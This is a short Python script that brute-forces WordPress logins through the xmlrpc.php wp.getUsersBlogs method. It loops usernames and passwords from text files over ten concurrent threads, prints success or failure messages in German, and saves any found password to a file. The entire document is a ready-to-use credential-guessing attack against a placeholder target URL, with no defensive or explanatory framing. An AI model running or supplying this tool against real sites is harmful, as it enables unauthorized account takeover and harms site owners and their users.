import threading
import requests
from rich import print
import sys


url = "https://website.com/xmlrpc.php" # TARGET URL


with open('usernames.txt', 'r') as file:
    usernames = file.read().splitlines()

with open('passwords.txt', 'r') as file:
    passwords = file.read().splitlines()

password_found = False
found_password = ""


def check_login(username, password):
    global password_found
    global found_password
    
    if password_found:
        return

    xml = """<?xml version="1.0"?>
    <methodCall>
      <methodName>wp.getUsersBlogs</methodName>
      <params>
        <param><value>{}</value></param>
        <param><value>{}</value></param>
      </params>
    </methodCall>
    """.format(username, password)
    
    response = requests.post(url, data=xml)
    
    if "isAdmin" in response.text:
        print("[green]Erfolgreicher Login - Benutzername: {} Passwort: {}".format(username, password))
        password_found = True
        found_password = password
    else:
        print("[red]Fehlgeschlagener Login - Benutzername: {} Passwort: {}".format(username, password))
        
    if password_found:
        with open("found_password.txt", "w") as f:
            f.write(found_password)
        sys.exit()

login_attempts = 0

# Threads
max_threads = 10
for i in range(0, len(usernames), max_threads):
    threads = []
    for username in usernames[i:i+max_threads]:
        for password in passwords:
            t = threading.Thread(target=check_login, args=(username, password))
            threads.append(t)
            t.start()
    
    for t in threads:
        t.join()
